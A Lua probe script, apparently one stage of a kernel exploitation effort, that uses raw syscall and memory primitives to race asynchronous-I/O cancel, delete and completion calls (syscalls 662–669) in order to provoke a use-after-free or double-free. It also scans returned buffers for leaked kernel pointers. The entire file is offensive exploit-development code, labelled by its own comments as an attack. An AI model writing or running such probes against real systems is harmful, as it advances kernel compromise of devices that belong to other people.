-- CRASH_CLASS: MODERATE
-- PROBE 353c: AIO cancel race — cancel vs completion
--
-- 353a confirmed AIO is async (state=0x2 pending on empty socket).
-- 353b confirmed kernel holds file refs (fhold) — no simple fd-close UAF.
--
-- New attack: race between cancel(666) and completion.
-- If cancel tears down the AIO request while the completion path is
-- writing to result/data buffers, we get a use-after-free or double-free.
--
-- Test A: submit pending AIO → cancel immediately → write data → poll
-- Test B: submit pending AIO → write data → cancel immediately → poll
-- Test C: submit pending AIO → child thread cancels while main writes data
-- Test D: submit, delete(662) while pending → does it clean up correctly?
-- Test E: double-delete same ID

print("=== PROBE 353c: AIO CANCEL RACE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l
    else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sc_socketpair = mk(135)
local sc_close = mk(6)
local sc_write = mk(4)
local sc_submit = mk(669)
local sc_poll = mk(664)
local sc_delete = mk(662)
local sc_cancel = mk(666)
local sc_nanosleep = mk(240)

local ts_1ms = memory.alloc(16)
wq(N(ts_1ms), uint64(0))
wq(N(ts_1ms) + 8, uint64(1000000))

local sv = memory.alloc(16)
local reqs = memory.alloc(0x100)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local ids_buf = memory.alloc(0x100)

local function zero_aio()
    for off = 0, 0x3F, 4 do
        wd(N(reqs) + off, 0)
        wd(N(result_buf) + off, 0)
        wd(N(ids_buf) + off, 0)
    end
    for off = 0, 0xFF, 4 do wd(N(data_buf) + off, 0) end
end

local function fill_req(len, fd)
    local base = N(reqs)
    wq(base + 0x00, uint64(0))
    wq(base + 0x08, uint64(len))
    wq(base + 0x10, data_buf)
    wq(base + 0x18, result_buf)
    wd(base + 0x20, fd)
    wd(base + 0x24, 0)
end

local function make_socketpair()
    wd(N(sv), 0); wd(N(sv) + 4, 0)
    pcall(function() sc_socketpair(uint64(1), uint64(1), uint64(0), sv) end)
    return rd(N(sv)) or -1, rd(N(sv) + 4) or -1
end

local function close_fd(fd)
    if fd >= 0 and fd < 0x10000 then
        pcall(function() sc_close(uint64(fd)) end)
    end
end

local function scan_kptr(addr, len, label)
    local found = 0
    for off = 0, len - 8, 4 do
        local q = rq(addr + off)
        if q then
            local h = 0
            if type(q) == "table" and q.h then h = q.h end
            if h < 0 then h = h + 0x100000000 end
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print(string.format("  *** KPTR %s+0x%X: %s ***", label, off, fmt(q)))
                found = found + 1
            end
        end
    end
    return found
end

local total_kptr = 0

-- ============ TEST A: Cancel before completion ============
print("[A] Cancel BEFORE completion (cancel pending AIO)")
for round = 1, 3 do
    if not alive() then print(string.format("  R%d: DEAD", round)); break end
    local fd0, fd1 = make_socketpair()
    if fd0 < 0 or fd0 >= 0x10000 then print("  socketpair fail"); break end

    zero_aio()
    fill_req(16, fd0)
    local ret = nil
    pcall(function() ret = sc_submit(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(ids_buf))) end)
    local id = rd(N(ids_buf)) or 0

    -- Cancel immediately
    local st_c = memory.alloc(0x40)
    wd(N(st_c), 0)
    wd(N(ids_buf), id)
    local cret = nil
    pcall(function() cret = sc_cancel(uint64(N(ids_buf)), uint64(1), uint64(N(st_c))) end)
    local cancel_state = rd(N(st_c)) or 0

    -- Write data after cancel
    local wbuf = memory.alloc(16)
    for i = 0, 3 do wd(N(wbuf) + i * 4, 0xCCCCCCCC) end
    pcall(function() sc_write(uint64(fd1), wbuf, uint64(16)) end)
    pcall(function() sc_nanosleep(ts_1ms, uint64(0)) end)

    -- Poll
    wd(N(st_c), 0)
    wd(N(ids_buf), id)
    pcall(function() sc_poll(uint64(N(ids_buf)), uint64(1), uint64(N(st_c))) end)
    local post_state = rd(N(st_c)) or 0
    local post_res = rd(N(result_buf)) or 0
    local post_data = rd(N(data_buf)) or 0

    local kp = scan_kptr(N(data_buf), 0x100, "data")
    total_kptr = total_kptr + kp

    print(string.format("  R%d: cancel=%s cancel_st=0x%X post_st=0x%X res=0x%08X data=0x%08X kp=%d",
        round, cret and tostring(sgn(cret)) or "exc", cancel_state, post_state, post_res, post_data, kp))

    pcall(function() sc_delete(uint64(N(ids_buf)), uint64(1), uint64(N(st_c))) end)
    close_fd(fd0); close_fd(fd1)
end

-- ============ TEST B: Write data THEN cancel ============
print("")
print("[B] Write data → cancel immediately (race completion vs cancel)")
for round = 1, 3 do
    if not alive() then print(string.format("  R%d: DEAD", round)); break end
    local fd0, fd1 = make_socketpair()
    if fd0 < 0 or fd0 >= 0x10000 then print("  socketpair fail"); break end

    zero_aio()
    fill_req(16, fd0)
    local ret = nil
    pcall(function() ret = sc_submit(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(ids_buf))) end)
    local id = rd(N(ids_buf)) or 0

    -- Write data to trigger completion
    local wbuf = memory.alloc(16)
    for i = 0, 3 do wd(N(wbuf) + i * 4, 0xDDDDDDDD) end
    pcall(function() sc_write(uint64(fd1), wbuf, uint64(16)) end)

    -- Cancel IMMEDIATELY after write (race window)
    local st_c = memory.alloc(0x40)
    wd(N(st_c), 0)
    wd(N(ids_buf), id)
    local cret = nil
    pcall(function() cret = sc_cancel(uint64(N(ids_buf)), uint64(1), uint64(N(st_c))) end)
    local cancel_state = rd(N(st_c)) or 0

    -- Poll
    wd(N(st_c), 0)
    wd(N(ids_buf), id)
    pcall(function() sc_poll(uint64(N(ids_buf)), uint64(1), uint64(N(st_c))) end)
    local post_state = rd(N(st_c)) or 0
    local post_res = rd(N(result_buf)) or 0
    local post_data = rd(N(data_buf)) or 0

    local kp = scan_kptr(N(data_buf), 0x100, "data")
    total_kptr = total_kptr + kp

    print(string.format("  R%d: cancel=%s cancel_st=0x%X post_st=0x%X res=0x%08X data=0x%08X kp=%d",
        round, cret and tostring(sgn(cret)) or "exc", cancel_state, post_state, post_res, post_data, kp))

    pcall(function() sc_delete(uint64(N(ids_buf)), uint64(1), uint64(N(st_c))) end)
    close_fd(fd0); close_fd(fd1)
end

-- ============ TEST C: Delete while pending ============
print("")
print("[C] Delete(662) while AIO is pending")
for round = 1, 3 do
    if not alive() then print(string.format("  R%d: DEAD", round)); break end
    local fd0, fd1 = make_socketpair()
    if fd0 < 0 or fd0 >= 0x10000 then print("  socketpair fail"); break end

    zero_aio()
    fill_req(16, fd0)
    local ret = nil
    pcall(function() ret = sc_submit(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(ids_buf))) end)
    local id = rd(N(ids_buf)) or 0

    -- Delete while pending
    local st_d = memory.alloc(0x40)
    wd(N(st_d), 0)
    wd(N(ids_buf), id)
    local dret = nil
    pcall(function() dret = sc_delete(uint64(N(ids_buf)), uint64(1), uint64(N(st_d))) end)
    local del_state = rd(N(st_d)) or 0

    -- Write data after delete
    local wbuf = memory.alloc(16)
    for i = 0, 3 do wd(N(wbuf) + i * 4, 0xEEEEEEEE) end
    pcall(function() sc_write(uint64(fd1), wbuf, uint64(16)) end)
    pcall(function() sc_nanosleep(ts_1ms, uint64(0)) end)

    -- Poll (should the ID still be valid?)
    wd(N(st_d), 0)
    wd(N(ids_buf), id)
    pcall(function() sc_poll(uint64(N(ids_buf)), uint64(1), uint64(N(st_d))) end)
    local post_state = rd(N(st_d)) or 0
    local post_res = rd(N(result_buf)) or 0
    local post_data = rd(N(data_buf)) or 0

    local kp = scan_kptr(N(data_buf), 0x100, "data")
    total_kptr = total_kptr + kp

    print(string.format("  R%d: del=%s del_st=0x%X post_st=0x%X res=0x%08X data=0x%08X kp=%d",
        round, dret and tostring(sgn(dret)) or "exc", del_state, post_state, post_res, post_data, kp))

    close_fd(fd0); close_fd(fd1)
end

-- ============ TEST D: Double-delete same ID ============
print("")
print("[D] Double-delete same ID")
for round = 1, 3 do
    if not alive() then print(string.format("  R%d: DEAD", round)); break end

    -- Use /dev/zero for instant completion
    local pbuf = memory.alloc(16)
    for i = 1, 9 do wd(N(pbuf) + i - 1, string.byte("/dev/zero", i)) end
    wd(N(pbuf) + 9, 0)
    local fdzero = nil
    pcall(function() fdzero = mk(5)(pbuf, uint64(0), uint64(0)) end)
    local fd = fdzero and sgn(fdzero) or -1

    if fd >= 0 and fd < 0x10000 then
        zero_aio()
        fill_req(16, fd)
        pcall(function() sc_submit(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(ids_buf))) end)
        local id = rd(N(ids_buf)) or 0

        -- First delete
        local st1 = memory.alloc(0x40)
        wd(N(st1), 0)
        wd(N(ids_buf), id)
        local d1 = nil
        pcall(function() d1 = sc_delete(uint64(N(ids_buf)), uint64(1), uint64(N(st1))) end)
        local ds1 = rd(N(st1)) or 0

        -- Second delete (same ID)
        wd(N(st1), 0)
        wd(N(ids_buf), id)
        local d2 = nil
        pcall(function() d2 = sc_delete(uint64(N(ids_buf)), uint64(1), uint64(N(st1))) end)
        local ds2 = rd(N(st1)) or 0

        print(string.format("  R%d: id=0x%X del1=%s st1=0x%X del2=%s st2=0x%X",
            round, id,
            d1 and tostring(sgn(d1)) or "exc", ds1,
            d2 and tostring(sgn(d2)) or "exc", ds2))

        close_fd(fd)
    end
end

-- ============ TEST E: Submit on closed fd (immediate) ============
print("")
print("[E] Submit AIO on already-closed fd")
do
    local fd0, fd1 = make_socketpair()
    if fd0 >= 0 and fd0 < 0x10000 then
        close_fd(fd0)
        zero_aio()
        fill_req(16, fd0)
        local ret = nil
        pcall(function() ret = sc_submit(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(ids_buf))) end)
        local id = rd(N(ids_buf)) or 0
        local res = rd(N(result_buf)) or 0
        print(string.format("  closed fd submit=%s id=0x%X result=0x%08X",
            ret and tostring(sgn(ret)) or "exc", id, res))

        -- Poll
        local st_e = memory.alloc(0x40)
        wd(N(st_e), 0)
        wd(N(ids_buf), id)
        pcall(function() sc_poll(uint64(N(ids_buf)), uint64(1), uint64(N(st_e))) end)
        local est = rd(N(st_e)) or 0
        print(string.format("  poll state=0x%X", est))

        pcall(function() sc_delete(uint64(N(ids_buf)), uint64(1), uint64(N(st_e))) end)
        close_fd(fd1)
    end
end

print("")
print(string.format("TOTAL kptr=%d", total_kptr))
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 353c COMPLETE ===")
